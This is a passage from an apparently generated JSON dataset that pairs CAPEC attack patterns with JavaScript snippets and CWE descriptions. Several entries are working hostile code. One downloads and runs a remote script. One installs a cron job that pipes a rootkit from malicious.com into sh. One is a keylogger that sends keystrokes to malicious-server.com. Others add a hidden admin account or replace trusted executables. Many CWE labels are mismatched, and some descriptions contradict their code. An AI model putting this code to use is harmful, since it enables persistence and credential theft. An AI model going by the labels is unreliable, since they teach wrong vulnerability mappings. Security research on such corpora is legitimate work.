        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the 'Contaminate Resource' CAPEC. The code transmits sensitive information in cleartext (CWE-319), stores sensitive data insecurely in localStorage (CWE-922), fails to properly clear sensitive data before reuse (CWE-226), logs sensitive data without removing it first (CWE-212), and shares sensitive data with an untrusted third party (CWE-402). These actions can lead to contamination of organizational information systems, requiring them to be taken offline for investigation and mitigation, thus denying availability."
    },
    {
        "capec_id": "549",
        "capec_name": "Local Execution of Code",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.get('http://example.com/malicious.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    fs.writeFile('malicious.js', data, (err) => {\n      if (err) throw err;\n      console.log('Malicious code downloaded and saved.');\n      require('./malicious.js'); // Execute the downloaded code\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading the file:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where malicious code is downloaded and executed on a local system. The code uses the 'http' module to fetch a JavaScript file from a remote server and the 'fs' module to save it locally. Once saved, the code immediately requires and executes the downloaded file. This example embodies the CAPEC 'Local Execution of Code' by showing how an adversary could install and execute malicious code. It also highlights CWE-494 'Download of Code Without Integrity Check' as the code does not verify the integrity or origin of the downloaded file, making it vulnerable to malicious code execution."
    },
    {
        "capec_id": "550",
        "capec_name": "Install New Service",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfunction installService(serviceName, servicePath) {\n  if (!fs.existsSync(servicePath)) {\n    console.error('Service path does not exist.');\n    return;\n  }\n\n  // CWE-1188: Initialization of a Resource with an Insecure Default\n  const serviceConfig = `\n  [Unit]\n  Description=${serviceName}\n  \n  [Service]\n  ExecStart=${servicePath}\n  \n  [Install]\n  WantedBy=multi-user.target\n  `;\n\n  fs.writeFileSync(`/etc/systemd/system/${serviceName}.service`, serviceConfig, { mode: 0o644 });\n\n  // CWE-520: .NET Misconfiguration: Use of Impersonation\n  exec('systemctl enable ' + serviceName, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error enabling service: ${error.message}`);\n      return;\n    }\n    console.log(`Service ${serviceName} installed and enabled.`);\n  });\n}\n\n// Example usage\ninstallService('maliciousService', '/usr/bin/malicious');",
        "description": "This JavaScript code snippet demonstrates the installation of a new service on a Unix-like system, which will be executed at startup. The function `installService` takes a service name and a service path as arguments. It first checks if the service path exists (CWE-284: Improper Access Control). Then, it creates a service configuration file with potentially insecure defaults (CWE-1188: Initialization of a Resource with an Insecure Default) and writes it to the system's service directory with appropriate permissions. Finally, it enables the service using a system command, which could be dangerous if the command is run with elevated privileges (CWE-520: .NET Misconfiguration: Use of Impersonation). This code embodies the main idea of the CAPEC by showing how an adversary might install a new service that runs at startup, potentially with elevated privileges."
    },
    {
        "capec_id": "551",
        "capec_name": "Modify Existing Service",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\n// CWE-15: External Control of System or Configuration Setting\n// CWE-522: Insufficiently Protected Credentials\n\n// Read service configuration from an external file\nfs.readFile('/path/to/service/config', 'utf8', (err, data) => {\n  if (err) throw err;\n  \n  // CWE-908: Use of Uninitialized Resource\n  let config;\n  try {\n    config = JSON.parse(data);\n  } catch (e) {\n    console.error('Invalid configuration file');\n    return;\n  }\n  \n  // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n  // Start a service with potentially untrusted configuration\n  exec(`service ${config.serviceName} start`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error starting service: ${error.message}`);\n      return;\n    }\n    console.log(`Service started: ${stdout}`);\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an existing service configuration is modified and a service is started based on this configuration. The code reads a service configuration from an external file, which can be controlled by an unauthorized user (CWE-15). It does not properly validate or restrict access to this configuration file (CWE-284), and the credentials or sensitive information within the file may not be securely protected (CWE-522). The configuration file is parsed without proper initialization checks (CWE-908), and the service is started without ensuring the integrity of the configuration (CWE-1193). This embodies the main idea of the CAPEC 'Modify Existing Service' by showing how modifying service configurations can lead to security vulnerabilities."
    },
    {
        "capec_id": "552",
        "capec_name": "Install Rootkit ",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst exec = require('child_process').exec;\n\nhttp.createServer((req, res) => {\n  if (req.url === '/install') {\n    const maliciousCode = `\n      const fs = require('fs');\n      fs.writeFile('/etc/cron.d/rootkit', '* * * * * root /bin/bash -c \"curl http://malicious.com/rootkit.sh | sh\"', (err) => {\n        if (err) throw err;\n      });\n    `;\n    fs.writeFile('/tmp/malicious.js', maliciousCode, (err) => {\n      if (err) throw err;\n      exec('node /tmp/malicious.js', (error, stdout, stderr) => {\n        if (error) {\n          console.error(`exec error: ${error}`);\n          return;\n        }\n        console.log(`stdout: ${stdout}`);\n        console.error(`stderr: ${stderr}`);\n      });\n    });\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Malicious code installed');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. When a request is made to the '/install' endpoint, it writes a malicious script to the '/tmp/malicious.js' file and executes it. The malicious script installs a cron job that periodically downloads and executes a rootkit from a remote server. This code demonstrates several vulnerabilities: improper access control (CWE-284), embedded malicious code (CWE-506), a trojan horse (CWE-507), exposure of sensitive system information (CWE-497), and OS command injection (CWE-78). The main idea is to show how an adversary can exploit these weaknesses to install a rootkit that hides its presence and alters system functionality."
    },
    {
        "capec_id": "554",
        "capec_name": "Functionality Bypass",
        "code_snippet": "const isAdmin = false;\n\nfunction accessAdminPanel() {\n  if (isAdmin) {\n    console.log('Access granted to admin panel.');\n  } else {\n    console.log('Access denied.');\n  }\n}\n\n// Bypassing client-side check\nisAdmin = true;\naccessAdminPanel();",
        "description": "This JavaScript code snippet demonstrates a functionality bypass vulnerability. The `isAdmin` variable is initially set to `false`, indicating that the user is not an admin. The `accessAdminPanel` function checks this variable to determine if access to the admin panel should be granted. However, the check is performed on the client side, allowing an attacker to simply change the `isAdmin` variable to `true` and bypass the access control. This represents CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-693 (Protection Mechanism Failure), as the protection mechanism is implemented on the client side and can be easily bypassed."
    },
    {
        "capec_id": "555",
        "capec_name": "Remote Services with Stolen Credentials",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst users = {\n  'admin': 'password123' // CWE-521: Weak Password Requirements\n};\n\nhttp.createServer((req, res) => {\n  const auth = req.headers['authorization'];\n  if (!auth) {\n    res.writeHead(401, { 'WWW-Authenticate': 'Basic realm=\"Secure Area\"' });\n    res.end('Authorization required');\n    return;\n  }\n\n  const [scheme, encoded] = auth.split(' ');\n  if (scheme !== 'Basic') {\n    res.writeHead(400);\n    res.end('Invalid authentication scheme');\n    return;\n  }\n\n  const [username, password] = Buffer.from(encoded, 'base64').toString().split(':');\n  if (users[username] && users[username] === password) {\n    res.writeHead(200);\n    res.end('Welcome to the secure area');\n  } else {\n    res.writeHead(403);\n    res.end('Access denied');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a basic HTTP server that uses Basic Authentication to protect access to a secure area. The server checks the 'Authorization' header for credentials, decodes them, and verifies them against a hardcoded user list. This example embodies the CAPEC 'Remote Services with Stolen Credentials' by demonstrating how an attacker could use stolen credentials to gain access to a system. The code also highlights several related CWEs: CWE-521 (Weak Password Requirements) by using a weak password, CWE-308 (Use of Single-factor Authentication) by relying solely on Basic Authentication, and CWE-522 (Insufficiently Protected Credentials) by transmitting credentials in an insecure manner (Base64 encoding)."
    },
    {
        "capec_id": "556",
        "capec_name": "Replace File Extension Handlers",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to change file handler for a given extension\nfunction replaceFileHandler(extension, newHandlerPath) {\n  const handlerConfigPath = path.join(__dirname, 'fileHandlers.json');\n  let handlers;\n\n  // Read the current file handlers configuration\n  try {\n    handlers = JSON.parse(fs.readFileSync(handlerConfigPath, 'utf8'));\n  } catch (err) {\n    console.error('Error reading file handlers configuration:', err);\n    return;\n  }\n\n  // Update the handler for the given extension\n  handlers[extension] = newHandlerPath;\n\n  // Write the updated configuration back to the file\n  try {\n    fs.writeFileSync(handlerConfigPath, JSON.stringify(handlers, null, 2), 'utf8');\n    console.log(`Handler for .${extension} files updated to ${newHandlerPath}`);\n  } catch (err) {\n    console.error('Error writing file handlers configuration:', err);\n  }\n}\n\n// Example usage: replace the handler for .txt files\nreplaceFileHandler('txt', '/path/to/malicious/program');",
        "description": "This JavaScript code snippet demonstrates how an application might replace the file handler for a given file extension, which is the main idea of the CAPEC 'Replace File Extension Handlers'. The function `replaceFileHandler` reads a JSON configuration file that maps file extensions to their respective handlers, updates the handler for a specified extension, and writes the updated configuration back to the file. This embodies CWE-284 (Improper Access Control) as it does not restrict who can modify the file handlers, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) as it relies on the file extension to determine behavior, and CWE-73 (External Control of File Name or Path) as it allows user input to control the file path used in the operation. The example usage shows how an attacker could replace the handler for .txt files with a path to a malicious program."
    },
    {
        "capec_id": "557",
        "capec_name": "DEPRECATED: Schedule Software To Run",
        "code_snippet": "const fs = require('fs');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/file', 'utf8', function(err, data) {\n  if (err) {\n    return console.log(err);\n  }\n  console.log(data);\n});\n\n// Schedule a task to run at a specific time\nsetTimeout(function() {\n  console.log('Scheduled task running...');\n  // Simulate modifying stored data without proper protection\n  fs.writeFile('/path/to/file', 'New data', function(err) {\n    if (err) {\n      return console.log(err);\n    }\n    console.log('Data written successfully');\n  });\n}, 10000); // Run after 10 seconds",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC 'Schedule Software To Run' by scheduling a task to run after a delay using `setTimeout`. The code also uses the deprecated `fs.readFile` function, which aligns with CWE-477 (Use of Obsolete Function). Additionally, it simulates modifying stored data without proper protection, which relates to the deprecated CWE-217 (Failure to Protect Stored Data from Modification). The code reads a file and then schedules a task to write new data to the file after 10 seconds, highlighting potential vulnerabilities in scheduling tasks and handling file operations without adequate security measures."
    },
    {
        "capec_id": "558",
        "capec_name": "Replace Trusted Executable",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-284: Improper Access Control\nfs.chmodSync('/path/to/trusted/executable', '777');\n\n// Replace the trusted executable with a malicious one\nfs.writeFileSync('/path/to/trusted/executable', 'malicious code here');\n\n// CWE-78: OS Command Injection\nexec('/path/to/trusted/executable', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker exploits improper access control (CWE-284) to replace a trusted executable with a malicious version. The code first changes the permissions of the trusted executable to be writable by anyone. It then overwrites the trusted executable with malicious code. Finally, it executes the now-malicious executable, which could lead to OS command injection (CWE-78). This embodies the main idea of the CAPEC 'Replace Trusted Executable' by showing how an attacker can replace a trusted executable to execute malicious code."
    },
    {
        "capec_id": "559",
        "capec_name": "Orbital Jamming",
        "code_snippet": "const net = require('net');\n\nconst rogueStation = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: Improper Verification of Source of a Communication Channel\n    if (!verifySource(socket)) {\n      console.log('Unverified source, but continuing to process data.');\n    }\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (!verifyMessageIntegrity(data)) {\n      console.log('Message integrity not verified, but processing data.');\n    }\n    // Disrupting the communication by sending rogue signals\n    disruptSatelliteCommunication(data);\n  });\n});\n\nrogueStation.listen(1337, '0.0.0.0');\n\nfunction verifySource(socket) {\n  // Placeholder for source verification logic\n  return false;\n}\n\nfunction verifyMessageIntegrity(data) {\n  // Placeholder for message integrity verification logic\n  return false;\n}\n\nfunction disruptSatelliteCommunication(data) {\n  console.log('Disrupting satellite communication with data:', data.toString());\n}",
        "description": "This JavaScript code snippet simulates a rogue uplink station that disrupts satellite communication by sending disruptive signals. The server listens for incoming connections and processes data without verifying the source (CWE-940) or ensuring message integrity (CWE-924). This lack of proper verification and integrity checks allows the rogue station to interfere with the satellite's communication, embodying the main idea of the 'Orbital Jamming' attack pattern described in the CAPEC. The code demonstrates how an adversary could exploit these weaknesses to disrupt satellite transmissions."
    },
    {
        "capec_id": "560",
        "capec_name": "Use of Known Domain Credentials",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = {\n  'admin': 'password123' // CWE-522: Insufficiently Protected Credentials\n};\n\nlet loginAttempts = {}; // CWE-307: Improper Restriction of Excessive Authentication Attempts\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (!loginAttempts[username]) {\n    loginAttempts[username] = 0;\n  }\n  if (loginAttempts[username] >= 5) { // No lockout mechanism\n    return res.status(429).send('Too many login attempts.');\n  }\n  if (users[username] && users[username] === password) { // CWE-308: Use of Single-factor Authentication\n    loginAttempts[username] = 0;\n    return res.send('Login successful');\n  } else {\n    loginAttempts[username]++;\n    return res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js server with a login endpoint. The code demonstrates several security weaknesses related to the CAPEC 'Use of Known Domain Credentials'. The 'users' object stores credentials in plain text (CWE-522: Insufficiently Protected Credentials). The login mechanism does not implement sufficient measures to prevent multiple failed authentication attempts (CWE-307: Improper Restriction of Excessive Authentication Attempts). Additionally, the authentication relies on single-factor authentication (CWE-308: Use of Single-factor Authentication). The code highlights the risks associated with these weaknesses, such as the potential for brute force attacks and the compromise of user credentials."
    },
    {
        "capec_id": "561",
        "capec_name": "Windows Admin Shares with Stolen Credentials",
        "code_snippet": "const net = require('net');\nconst fs = require('fs');\n\nconst adminCredentials = { username: 'admin', password: 'password123' }; // CWE-521: Weak Password Requirements\n\nfunction authenticate(credentials) {\n  // CWE-308: Use of Single-factor Authentication\n  if (credentials.username === adminCredentials.username && credentials.password === adminCredentials.password) {\n    return true;\n  }\n  return false;\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const credentials = JSON.parse(data.toString());\n    if (authenticate(credentials)) {\n      // CWE-522: Insufficiently Protected Credentials\n      socket.write('Access granted to admin shares');\n      fs.readFile('/admin/share/file.txt', 'utf8', (err, data) => {\n        if (err) throw err;\n        socket.write(data);\n      });\n    } else {\n      socket.write('Access denied');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');",
        "description": "This JavaScript code snippet sets up a simple TCP server that listens for incoming connections. It uses weak admin credentials (CWE-521) and single-factor authentication (CWE-308) to grant access to admin shares. If the provided credentials match the hardcoded admin credentials, access is granted, and the contents of a file in the admin share are sent back to the client. This demonstrates the CAPEC scenario where an adversary with stolen or guessed credentials can access sensitive admin shares. The code also highlights CWE-522 by transmitting credentials in an insecure manner."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Path to the shared directory\nconst sharedDir = '/shared/files';\n\n// Malicious content to be added\nconst maliciousContent = '<script>alert(\"Hacked!\");</script>';\n\n// Function to modify a shared file\nfunction modifySharedFile(fileName) {\n  const filePath = path.join(sharedDir, fileName);\n  \n  // Check if the file exists\n  if (fs.existsSync(filePath)) {\n    // Read the original content\n    let originalContent = fs.readFileSync(filePath, 'utf8');\n    \n    // Append malicious content\n    let modifiedContent = originalContent + maliciousContent;\n    \n    // Write the modified content back to the file\n    fs.writeFileSync(filePath, modifiedContent, 'utf8');\n    console.log(`File ${fileName} has been modified.`);\n  } else {\n    console.log(`File ${fileName} does not exist.`);\n  }\n}\n\n// Example usage\nmodifySharedFile('example.html');",
        "description": "This JavaScript code snippet demonstrates a potential attack where an adversary modifies a file in a shared directory by appending malicious content. The `modifySharedFile` function takes a file name, checks if it exists in the shared directory, reads its content, appends a malicious script, and writes the modified content back to the file. This embodies the CAPEC 'Modify Shared File' by showing how an attacker can manipulate shared files to include malicious code. The code also touches on related CWEs such as 'Improper Access Control' (CWE-284) by not restricting access to the shared directory, and 'Unrestricted Upload of File with Dangerous Type' (CWE-434) by allowing the inclusion of a script tag in the file."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'public', uploadedFile.name);\n\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and the express-fileupload middleware to create a simple file upload server. The server allows users to upload files to the 'public' directory, which is typically accessible via the web server. The code does not perform any checks on the file type, extension, or content, and it stores the uploaded files directly under the web root. This embodies the main idea of the CAPEC 'Add Malicious File to Shared Webroot' by demonstrating how an adversary could upload a malicious file to a web server and then access it via a web browser. The related CWEs are represented as follows: CWE-284 (Improper Access Control) is shown by the lack of access restrictions on the uploaded files, CWE-219 (Storage of File with Sensitive Data Under Web Root) is demonstrated by storing files in the 'public' directory, CWE-433 (Unparsed Raw Web Content Delivery) is implied by the server's potential to serve raw content, CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) is shown by the lack of validation on the file name or extension, and CWE-494 (Download of Code Without Integrity Check) is represented by the absence of integrity checks on the uploaded files."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst logonScriptPath = path.join('C:', 'Users', 'Public', 'logon.bat');\n\n// CWE-798: Use of Hard-coded Credentials\nconst hardCodedPassword = 'P@ssw0rd123';\n\n// CWE-284: Improper Access Control\nfs.chmodSync(logonScriptPath, '777');\n\n// CWE-259: Use of Hard-coded Password\nconst maliciousCode = `@echo off\nnet user attacker ${hardCodedPassword} /add\nnet localgroup administrators attacker /add\n`;\n\n// Append malicious code to logon script\nfs.appendFileSync(logonScriptPath, maliciousCode);\n\nconsole.log('Malicious code injected into logon script.');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker modifies a logon script to maintain persistence on a system. The code first sets the permissions of the logon script to be fully accessible (CWE-284: Improper Access Control). It then appends malicious code to the logon script, which creates a new user with hard-coded credentials (CWE-798 and CWE-259: Use of Hard-coded Credentials/Password). This malicious code will run every time a user logs on, allowing the attacker to maintain access to the system. The snippet embodies the main idea of the CAPEC 'Run Software at Logon' by showing how an attacker can exploit logon scripts to execute malicious code and maintain persistence."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nconst passwords = ['password123', 'welcome1', '123456'];\n\nfunction attemptLogin(username, password) {\n  // Simulate a login attempt\n  console.log(`Attempting login for ${username} with password ${password}`);\n  // In a real scenario, this would check the credentials against a database\n  return false; // Simulate failed login\n}\n\nfunction passwordSpraying(users, passwords) {\n  for (let password of passwords) {\n    for (let user of users) {\n      if (attemptLogin(user, password)) {\n        console.log(`Successful login for ${user} with password ${password}`);\n        return;\n      }\n    }\n  }\n  console.log('Password spraying attempt completed. No successful logins.');\n}\n\npasswordSpraying(users, passwords);",
        "description": "This JavaScript code snippet demonstrates a basic password spraying attack. The `users` array contains a list of user accounts, and the `passwords` array contains a list of common passwords. The `attemptLogin` function simulates a login attempt for a given username and password, always returning false to simulate failed logins. The `passwordSpraying` function iterates over each password and attempts to log in with each user account using that password. This approach mimics the password spraying technique by trying a small set of common passwords across multiple user accounts, thereby avoiding rapid account lockouts. The code highlights vulnerabilities such as weak password requirements (CWE-521), improper restriction of excessive authentication attempts (CWE-307), and reliance on single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  const hash = crypto.createHash('sha256');\n  hash.update(password);\n  return hash.digest('hex');\n}\n\nconst password = 'user_password';\nconst hashedPassword = hashPassword(password);\nconsole.log(`Hashed Password: ${hashedPassword}`);",
        "description": "This JavaScript code snippet demonstrates a vulnerable way of hashing a password using a one-way cryptographic hash function without a salt. The function `hashPassword` takes a password as input and hashes it using the SHA-256 algorithm. The hashed password is then printed to the console. This approach is vulnerable because it does not use a salt, making it susceptible to rainbow table attacks. The code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' and related CWE-759 'Use of a One-Way Hash without a Salt'."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Using an obsolete function to read a file\nfs.readFile('/path/to/sensitive/data.txt', 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log('Sensitive Data:', data);\n});\n\n// Making a security decision based on DNS lookup\nconst domain = 'example.com';\ndns.lookup(domain, (err, address) => {\n  if (err) throw err;\n  if (address === '192.168.1.1') {\n    console.log('Access granted to:', domain);\n  } else {\n    console.log('Access denied to:', domain);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC concept of obtaining data via utilities, incorporating related deprecated CWEs. The code uses the obsolete `fs.readFile` function to read sensitive data from a file, which suggests that the code has not been actively reviewed or maintained (CWE-477). Additionally, it makes a security decision based on a DNS lookup (CWE-247), which is unreliable and can be manipulated. The code highlights the risks of using outdated functions and making security decisions based on potentially insecure data sources."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "document.addEventListener('keydown', function(event) {\n  var keylog = localStorage.getItem('keylog') || '';\n  keylog += event.key;\n  localStorage.setItem('keylog', keylog);\n});\n\nfunction sendKeylog() {\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://malicious-server.com/collect', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('data=' + encodeURIComponent(localStorage.getItem('keylog')));\n  localStorage.removeItem('keylog');\n}\n\nsetInterval(sendKeylog, 60000);",
        "description": "This JavaScript code snippet demonstrates a simple keylogger that captures all keystrokes made by a user and stores them in the browser's localStorage. Every minute, the stored keystrokes are sent to a malicious server. This embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by showing how an adversary can capture user credentials through keystroke logging. The code also touches on related CWEs: CWE-309 (Use of Password System for Primary Authentication) by assuming passwords are entered via keystrokes, CWE-522 (Insufficiently Protected Credentials) by storing and transmitting keystrokes insecurely, and CWE-521 (Weak Password Requirements) by not enforcing strong password policies, making it easier for attackers to exploit captured keystrokes."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Log sensitive information to a file\n      fs.appendFile('user_data.log', body, (err) => {\n        if (err) throw err;\n      });\n      res.end('Data received');\n    });\n  } else {\n    res.end('Send a POST request');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests. When a POST request is received, it captures the data sent by the user and logs it to a file named 'user_data.log'. This embodies the main idea of CAPEC-Collect Data as Provided by Users, as it captures and stores user-provided information without any deception. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-214 (Invocation of Process Using Visible Sensitive Information), by potentially exposing sensitive user data to unauthorized actors through improper logging practices."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const user = queryObject.user;\n\n  // Deprecated function usage\n  if (user == 'admin') {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.write('Welcome Admin!');\n  } else {\n    res.writeHead(401, {'Content-Type': 'text/html'});\n    res.write('Unauthorized');\n  }\n  res.end();\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that checks the 'user' query parameter to determine if the user is 'admin'. If the user is 'admin', it responds with 'Welcome Admin!'; otherwise, it responds with 'Unauthorized'. The code demonstrates the use of deprecated functions and unchecked error conditions. Specifically, it uses the deprecated 'url.parse' function and does not handle potential errors in parsing the URL or in the HTTP request handling. This embodies the main idea of the CAPEC by showing how deprecated functions and unchecked error conditions can lead to security vulnerabilities, such as authentication bypass issues."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  // CWE-778: Insufficient Logging\n  if (!event || !event.message) {\n    return;\n  }\n\n  // CWE-532: Insertion of Sensitive Information into Log File\n  if (event.message.includes('password') || event.message.includes('secret')) {\n    return;\n  }\n\n  // CWE-779: Logging of Excessive Data\n  if (event.message.length > 1000) {\n    return;\n  }\n\n  // Simulate blocking the log from being sent to a central repository\n  // CAPEC: Block Logging to Central Repository\n  try {\n    fs.appendFileSync(logFilePath, `${new Date().toISOString()} - ${event.message}\\n`);\n  } catch (err) {\n    console.error('Failed to write to log file:', err);\n  }\n}\n\n// Example usage\nlogEvent({ message: 'User login attempt failed' });\nlogEvent({ message: 'password=123456' });\nlogEvent({ message: 'A'.repeat(1001) });",
        "description": "This JavaScript code snippet demonstrates a logging function that embodies the main idea of CAPEC-117: Block Logging to Central Repository. The function `logEvent` is designed to log events to a local file but includes checks to avoid common logging weaknesses. It avoids logging excessive data (CWE-779), sensitive information (CWE-532), and ensures that only valid events are logged (CWE-778). The code simulates blocking the log from being sent to a central repository by writing logs only to a local file, which aligns with the CAPEC's description of preventing logs from reaching a central location to hide indicators of compromise."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath, fileContent) {\n  // CWE-434: Unrestricted upload of file with dangerous type\n  if (path.extname(filePath) !== '.txt') {\n    throw new Error('Only .txt files are allowed');\n  }\n\n  // CWE-646: Reliance on file name or extension of externally-supplied file\n  if (filePath.includes('..')) {\n    throw new Error('Invalid file path');\n  }\n\n  // CWE-774: Allocation of file descriptors without limits\n  const maxFileSize = 1024 * 1024; // 1MB limit\n  if (fileContent.length > maxFileSize) {\n    throw new Error('File size exceeds limit');\n  }\n\n  // CWE-409: Improper handling of highly compressed data\n  if (isHighlyCompressed(fileContent)) {\n    throw new Error('Highly compressed data is not allowed');\n  }\n\n  // Artificially inflate file size\n  const inflatedContent = fileContent + ' '.repeat(1024 * 1024); // Add 1MB of spaces\n  fs.writeFileSync(filePath, inflatedContent);\n  console.log('File uploaded successfully');\n}\n\nfunction isHighlyCompressed(data) {\n  // Simple check for high compression ratio (placeholder logic)\n  return data.length < 100;\n}\n\n// Example usage\ntry {\n  uploadFile('example.txt', 'This is a test file content');\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a file upload function that embodies the concept of artificially inflating file sizes, potentially leading to a Denial of Service (DoS) condition. The function includes checks for several related CWEs: it restricts file types to .txt (CWE-434), prevents directory traversal attacks (CWE-646), limits file size to 1MB (CWE-774), and disallows highly compressed data (CWE-409). The function then artificially inflates the file size by adding 1MB of spaces to the file content before saving it. This represents the CAPEC idea of modifying file contents to inflate their size, which could exhaust storage resources."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction listProcesses() {\n  exec('ps aux', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error executing command: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Running processes:\\n${stdout}`);\n  });\n}\n\nlistProcesses();",
        "description": "This JavaScript code snippet uses Node.js's 'child_process' module to execute the 'ps aux' command, which lists all running processes on a Unix-like system. The output of this command is then printed to the console. This embodies the main idea of CAPEC-170 (Process Footprinting) by exposing information about the currently running processes. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) because it does not restrict access to the process information, potentially allowing unauthorized users to gain insights into the system's state and running applications. This information could be leveraged for further malicious activities."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getServiceInfo() {\n  exec('tasklist /svc', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Service Information: ${stdout}`);\n  });\n}\n\ngetServiceInfo();",
